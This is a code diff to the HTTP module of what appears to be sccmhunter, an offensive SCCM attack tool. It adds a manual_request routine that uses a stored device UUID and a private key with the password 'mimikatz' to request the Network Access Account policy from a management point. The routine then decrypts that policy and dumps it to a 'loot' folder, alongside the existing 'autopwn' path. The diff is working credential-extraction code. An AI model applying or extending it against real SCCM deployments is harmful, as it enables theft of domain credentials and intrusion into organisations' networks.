@@ -1,8 +1,9 @@
+from cryptography.hazmat.primitives import serialization
 from lib.ldap import init_ldap_session
 from lib.logger import console, logger, init_logger
 from lib.attacks.find import SCCMHUNTER
 from lib.scripts.addcomputer import AddComputerSAMR
-from lib.scripts.sccmwtf import SCCMTools
+from lib.scripts.sccmwtf import SCCMTools, Tools
 from lib.scripts.banner import show_banner
 import requests
 import getpass
@@ -12,7 +13,7 @@ import sqlite3
 import ldap3
 import sys
 import os
-
+import re
 
 
 class HTTP:
@@ -20,7 +21,7 @@ class HTTP:
     def __init__(self, username=None, password=None, domain=None, target_dom=None, 
                     dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
                     aes=None, debug=False, auto=False, computer_pass=None, computer_name=None,
-                    logs_dir=None):
+                    uuid=None, mp=None, sleep=None, logs_dir=None):
         self.username = username
         self.password = password
         self.domain = domain
@@ -37,6 +38,9 @@ class HTTP:
         self.auto = auto
         self.computer_name = computer_name
         self.computer_pass = computer_pass
+        self.uuid = uuid
+        self.mp = mp
+        self.sleep = int(sleep)
         self.targets = []
         self.logs_dir = logs_dir
         self.database = f"{logs_dir}/db/find.db"
@@ -44,25 +48,50 @@ class HTTP:
 
  
     def run(self):
+        if self.uuid:
+            self.manual_request()
+            return
         if os.path.exists(self.database):
             try:
                 logger.info("[*] Searching for Management Points from database.")
                 targets = self.conn.execute(f'''select Hostname FROM ManagementPoints''').fetchall()
                 self.targets = self.http_hunter(targets)
-                self.autopwn()
+                if self.targets:
+                    self.autopwn()
             except sqlite3.OperationalError:
                 logger.debug("[*] Database file not found. Did you run the find module?")
             except Exception as e:
                 logger.info("An unknown error occured. Use -debug to print a stacktrace.")
                 logger.debug(e)
-    
-            # logger.info("Database file not found, searching LDAP for site servers.")
-            # sccmhunter = SCCMHUNTER(username=self.username, password=self.password, domain=self.domain, 
-            #                         target_dom=self.target_dom, dc_ip=self.dc_ip,ldaps=self.ldaps,
-            #                         kerberos=self.kerberos, no_pass=self.no_pass, hashes=self.hashes, 
-            #                         aes=self.aes, debug=self.debug, logs_dir=self.logs_dir)
-            # sccmhunter.run()
-            # self.run()
+
+    def manual_request(self):
+        target_mp_url = f"http://{self.mp}"
+        sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir)
+        with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
+            data = f.read()
+        with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
+            key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")           
+        deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
+        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
+        urls = [result.group(1)]
+        try:
+            for url in urls:
+                result = sccmwtf.requestPolicy(url)
+                if result.startswith("<HTML>"):
+                    try: 
+                        result = sccmwtf.requestPolicy(url, self.uuid, True, True, key=key)
+                        decryptedResult = sccmwtf.parseEncryptedPolicy(result)
+                        sccmwtf.parse_xml(decryptedResult)
+                        file_name = f"{self.logs_dir}/loot/{self.mp.split('.')[0]}_naapolicy.xml"
+                        Tools.write_to_file(decryptedResult, file_name)
+                        logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self.mp.split('.')[0]}_naapolicy.xml")
+                        return True
+                    except Exception as e:
+                        logger.info(e)
+
+        except Exception as e:
+            print(e)
+            input("breaking for exception")
 
 
     def autopwn(self):
@@ -93,8 +122,8 @@ class HTTP:
                 target_name = self.computer_name[:-1]
                 target_fqdn = f'{target_name}.{self.domain}'
                 try:
-                    logger.info(f"[*] Atempting to grab policy from {target}")
-                    SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.logs_dir)
+                    logger.info(f"[*] Attempting to grab policy from {target}")
+                    SCCMWTF=SCCMTools(target_name, target_fqdn, target, self.computer_name, self.computer_pass, self.sleep, self.logs_dir)
                     result = SCCMWTF.sccmwtf_run()
                     break
                 except Exception as e:
@@ -124,7 +153,6 @@ class HTTP:
             return validated
         else:
             print("[-] No HTTP endpoints found :(")
-
 
 
     def validate_add(self, computername):
